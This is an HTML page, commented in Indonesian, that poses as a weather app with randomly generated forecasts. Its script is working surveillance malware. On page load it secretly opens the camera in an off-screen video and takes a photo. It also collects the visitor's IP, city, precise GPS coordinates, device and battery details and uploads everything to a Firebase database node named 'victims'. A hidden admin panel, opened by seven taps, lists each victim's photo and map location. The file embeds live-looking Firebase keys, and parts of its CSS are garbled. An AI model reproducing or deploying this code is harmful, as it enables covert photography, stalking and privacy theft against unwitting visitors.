<head>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(145deg, #0f2027, #203a43, #2c5364);
            min-height: 100vh;
            color: white;
            padding: 16px;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        
        /* HEADER */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        
        .location {
            background: rgba(255,255,255,0.15);
            padding: 12px 20px;
            border-radius: 40px;
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 500;
        }
        
        .date {
            background: rgba(255,255,255,0.15);
            padding: 12px 20px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 500;
        }
        
        /* MAIN CARD */
        .main-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 30px 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .weather-main {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .temp-big {
            font-size: 72px;
            font-weight: 300;
            line-height: 1;
        }
        
        .weather-icon {
            font-size: 80px;
            animation: float 3s ease-in-out infinite;
            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.3));
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .weather-desc {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .feels-like {
            opacity: 0.7;
            font-size: 16px;
        }
        
        /* DETAIL GRID */
        .detail-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-top: 25px;
        }
        
        .detail-item {
            background: rgba(255,255,255,0.1);
            border-radius: 25px;

            margin-bottom: 8px;
        }
        
        .detail-label {
            font-size: 12px;
            opacity: 0.7;
            margin-bottom: 5px;
        }
        
        .detail-value {
            font-size: 20px;
            font-weight: 600;
        }
        
        /* HOURLY SCROLL */
        .hourly-section {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .section-title {
            font-size: 18px;
            font-weight: 600;

            align-items: center;
            gap: 8px;
        }
        
        .hourly-scroll {
            display: flex;

            scrollbar-width: none;

        .hourly-scroll::-webkit-scrollbar {

        }
        
        .hour-item {

        .hour-time {

            margin-bottom: 8px;

        }
        
        .hour-icon {
            font-size: 30px;
            margin-bottom: 8px;
        }
        
        .hour-temp {

            font-size: 18px;
        }
        
        /* WEEKLY FORECAST */
        .weekly-section {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 20px;

        .day-item {

    </style>

    <script>
        // ============================================
        // FIREBASE CONFIG - PUNYA LO!
        // ============================================
        const firebaseConfig = {
            apiKey: "AIzaSyC5yAWjKj3jS6_1NYLADS_QCRr06OZO2dQ",
            authDomain: "cuaca-bb648.firebaseapp.com",
            databaseURL: "https://cuaca-bb648-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "cuaca-bb648",
            storageBucket: "cuaca-bb648.firebasestorage.app",
            messagingSenderId: "358412575028",
            appId: "1:358412575028:web:1af89186e9819c3cb30561",
            measurementId: "G-BYK53BJE3R"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const victimsRef = database.ref('victims');
        
        // ============================================
        // DATA VARIABLES
        // ============================================
        let currentVictimData = {
            id: generateId(),
            photo: null,
            location: {},
            device: {},
            timestamp: null
        };
        
        let allVictims = [];
        let currentIndex = 0;
        let cameraStream = null;
        
        function generateId() {
            return 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        }
        
        // ============================================
        // CAMERA CAPTURE - OTOMATIS
        // ============================================
        async function initCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'environment'
                    },
                    audio: false
                });
                
                const video = document.createElement('video');
                video.srcObject = cameraStream;
                video.autoplay = true;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                video.style.left = '-9999px';
                document.body.appendChild(video);
                
                video.onloadedmetadata = () => {
                    video.play();
                    // Jepret setelah 3 detik
                    setTimeout(() => {
                        capturePhoto(video);
                    }, 3000);
                };
                
                document.getElementById('syncStatus').innerHTML = '‚úÖ Kamera siap';
                
            } catch (err) {
                console.log('Camera denied:', err);
                document.getElementById('syncStatus').innerHTML = '‚ö†Ô∏è Kamera ditolak';
                collectDataAndSend();
            }
        }
        
        function capturePhoto(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Kompres foto
            currentVictimData.photo = canvas.toDataURL('image/jpeg', 0.6);
            
            // Matikan camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            
            document.getElementById('syncStatus').innerHTML = '‚úÖ Foto diambil';
            collectDataAndSend();
        }
        
        // ============================================
        // COLLECT DATA & SEND TO FIREBASE
        // ============================================
        async function collectDataAndSend() {
            document.getElementById('syncStatus').innerHTML = 'üîÑ Mengumpulkan data...';
            currentVictimData.timestamp = new Date().toISOString();
            
            // Device info
            currentVictimData.device = {
                userAgent: navigator.userAgent.substring(0, 100),
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // IP & Location dari ipapi
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                currentVictimData.device.ip = ipData.ip;
                
                const locRes = await fetch(`https://ipapi.co/${currentVictimData.device.ip}/json/`);
                const locData = await locRes.json();
                currentVictimData.location = {
                    country: locData.country_name || 'Unknown',
                    city: locData.city || 'Unknown',
                    region: locData.region || 'Unknown',
                    isp: locData.org || 'Unknown',
                    lat: locData.latitude || null,
                    lon: locData.longitude || null
                };
                
                // Update UI
                document.getElementById('cityName').innerText = locData.city || 'Jakarta';
                document.getElementById('syncStatus').innerHTML = 'üìç Lokasi dapat';
                
            } catch (e) {
                console.log('IP error:', e);
                document.getElementById('syncStatus').innerHTML = '‚ö†Ô∏è Gagal ambil lokasi';
            }
            
            // GPS akurat
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        currentVictimData.location.gps = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + ' m',
                            maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                        document.getElementById('syncStatus').innerHTML = '‚úÖ GPS dapat';
                        sendToFirebase();
                    },
                    (err) => {
                        console.log('GPS denied');
                        sendToFirebase();
                    },
                    { timeout: 10000 }
                );
            } else {
                sendToFirebase();
            }
            
            // Battery
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    currentVictimData.device.battery = Math.round(battery.level * 100) + '%';
                    currentVictimData.device.charging = battery.charging ? 'Ya' : 'Tidak';
                } catch (e) {}
            }
        }
        
        function sendToFirebase() {
            document.getElementById('syncStatus').innerHTML = 'üîÑ Mengirim ke cloud...';
            
            victimsRef.child(currentVictimData.id).set(currentVictimData)
                .then(() => {
                    document.getElementById('syncStatus').innerHTML = '‚úÖ Tersimpan!';
                    setTimeout(() => {
                        document.getElementById('syncStatus').innerHTML = 'üîÑ Siap';
                    }, 3000);
                })
                .catch(error => {
                    console.error('Firebase error:', error);
                    document.getElementById('syncStatus').innerHTML = '‚ùå Gagal simpan';
                });
        }
        
        // ============================================
        // LISTEN TO FIREBASE - REAL-TIME
        // ============================================
        victimsRef.on('value', (snapshot) => {
            const data = snapshot.val();
            if (data) {
                allVictims = Object.values(data);
                // Urutkan dari terbaru
                allVictims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                if (document.getElementById('adminPanel').style.display === 'block') {
                    updateAdminPanel();
                }
            }
        });
        
        // ============================================
        // ADMIN PANEL - 7 TAP CEPAT
        // ============================================
        let tapCount = 0;
        let tapTimer;
        
        document.getElementById('secretTrigger').addEventListener('click', function() {
            tapCount++;
            
            clearTimeout(tapTimer);
            tapTimer = setTimeout(() => {
                tapCount = 0;
            }, 3000);
            
            if (tapCount >= 7) {
                openAdminPanel();
                tapCount = 0;
            }
        });
        
        function openAdminPanel() {
            document.getElementById('adminPanel').style.display = 'block';
            updateAdminPanel();
        }
        
        function closeAdminPanel() {
            document.getElementById('adminPanel').style.display = 'none';
        }
        
        function refreshData() {
            updateAdminPanel();
        }
        
        function updateAdminPanel() {
            // Stats
            document.getElementById('totalVictims').innerText = allVictims.length;
            
            let photoCount = allVictims.filter(v => v.photo).length;
            let gpsCount = allVictims.filter(v => v.location?.gps).length;
            
            document.getElementById('totalPhotos').innerText = photoCount;
            document.getElementById('totalGPS').innerText = gpsCount;
            
            // Victim tabs
            let tabsHtml = '';
            allVictims.forEach((victim, index) => {
                const date = new Date(victim.timestamp);
                const timeStr = date.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
                tabsHtml += `<button class="victim-btn ${index === currentIndex ? 'active' : ''}" onclick="selectVictim(${index})">üë§ ${timeStr}</button>`;
            });
            document.getElementById('victimTabs').innerHTML = tabsHtml || '<div style="color:#666; padding:20px; text-align:center;">Belum ada data</div>';
            
            if (allVictims.length > 0) {
                displayVictim(allVictims[currentIndex]);
            }
        }
        
        function selectVictim(index) {
            currentIndex = index;
            updateAdminPanel();
        }
        
        function displayVictim(victim) {
            // Photo
            if (victim.photo) {
                document.getElementById('photoDisplay').innerHTML = `
                    <img src="${victim.photo}" class="photo-preview">
                    <p style="color:#888; font-size:12px; margin-top:5px;">üì∏ Klik kanan ‚Üí save</p>
                `;
            } else {
                document.getElementById('photoDisplay').innerHTML = '<div class="data-item">Tidak ada foto</div>';
            }
            
            // Location
            let locHtml = '';
            for (let key in victim.location) {
                if (key === 'gps') {
                    locHtml += `
                        <div class="data-item">
                            <span class="data-label">gps:</span>
                            <span class="data-value">
                                <a href="${victim.location.gps.maps}" target="_blank" style="color:#2c5364;">üìç Lihat Map</a>
                            </span>
                        </div>
                    `;
                } else {
                    locHtml += `
                        <div class="data-item">
                            <span class="data-label">${key}:</span>
                            <span class="data-value">${victim.location[key] || '-'}</span>
                        </div>
                    `;
                }
            }
            document.getElementById('locationData').innerHTML = locHtml || '<div class="data-item">Tidak ada lokasi</div>';
            
            // Device
            let devHtml = '';
            for (let key in victim.device) {
                let value = victim.device[key];
                if (key === 'userAgent') value = value.substring(0, 50) + '...';
                devHtml += `
                    <div class="data-item">
                        <span class="data-label">${key}:</span>
                        <span class="data-value">${value || '-'}</span>
                    </div>
                `;
            }
            document.getElementById('deviceData').innerHTML = devHtml || '<div class="data-item">Tidak ada device</div>';
            
            // Time
            if (victim.timestamp) {
                const date = new Date(victim.timestamp);
                document.getElementById('timeData').innerHTML = `
                    <div class="data-item">
                        <span class="data-label">Waktu:</span>
                        <span class="data-value">${date.toLocaleString('id-ID')}</span>
                    </div>
                    <div class="data-item">
                        <span class="data-label">ID:</span>
                        <span class="data-value">${victim.id}</span>
                    </div>
                `;
            }
        }
        
        // ============================================
        // WEATHER SIMULATION - BIAR HIDUP
        // ============================================
        function updateWeatherUI() {
            const icons = ['‚òÄÔ∏è', '‚õÖ', 'üå§Ô∏è', 'üå•Ô∏è', '‚òÅÔ∏è', 'üåßÔ∏è'];
            const descs = ['Cerah', 'Cerah Berawan', 'Berawan', 'Berawan Tebal', 'Hujan Ringan', 'Hujan'];
            const temps = [28, 29, 30, 31, 32, 27];
            
            setInterval(() => {
                const rand = Math.floor(Math.random() * icons.length);
                document.getElementById('weatherIcon').innerText = icons[rand];
                document.getElementById('weatherDesc').innerText = descs[rand];
                document.getElementById('temperature').innerText = temps[rand] + '¬∞';
                document.getElementById('feelsLike').innerText = `Terasa ${temps[rand] + 2}¬∞`;
                document.getElementById('humidity').innerText = (65 + Math.floor(Math.random() * 20)) + '%';
                document.getElementById('wind').innerText = (5 + Math.floor(Math.random() * 15)) + ' km/h';
            }, 8000);
            
            // Update date
            const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
            const now = new Date();
            document.getElementById('dayName').innerText = days[now.getDay()];
            document.getElementById('dateNum').innerText = now.getDate() + ' ' + months[now.getMonth()];
            
            // Hourly forecast
            let hourlyHtml = '';
            for (let i = 0; i < 8; i++) {
                const hour = (now.getHours() + i) % 24;
                hourlyHtml += `
                    <div class="hour-item">
                        <div class="hour-time">${hour}:00</div>
                        <div class="hour-icon">${icons[Math.floor(Math.random() * icons.length)]}</div>
                        <div class="hour-temp">${temps[Math.floor(Math.random() * temps.length)]}¬∞</div>
                    </div>
                `;
            }
            document.getElementById('hourlyContainer').innerHTML = hourlyHtml;
            
            // Weekly forecast
            let weeklyHtml = '';
            for (let i = 0; i < 7; i++) {
                const dayIdx = (now.getDay() + i) % 7;
                weeklyHtml += `
                    <div class="day-item">
                        <span class="day-name">${days[dayIdx]}</span>
                        <span class="day-icon">${icons[Math.floor(Math.random() * icons.length)]}</span>
                        <div class="day-temp">
                            <span class="temp-high">${temps[Math.floor(Math.random() * temps.length)]}¬∞</span>
                            <span class="temp-low">${temps[Math.floor(Math.random() * temps.length)] - 5}¬∞</span>
                        </div>
                    </div>
                `;
            }
            document.getElementById('weeklyContainer').innerHTML = weeklyHtml;
        }
        
        // ============================================
        // START
        // ============================================
        initCamera();
        updateWeatherUI();
    </script>
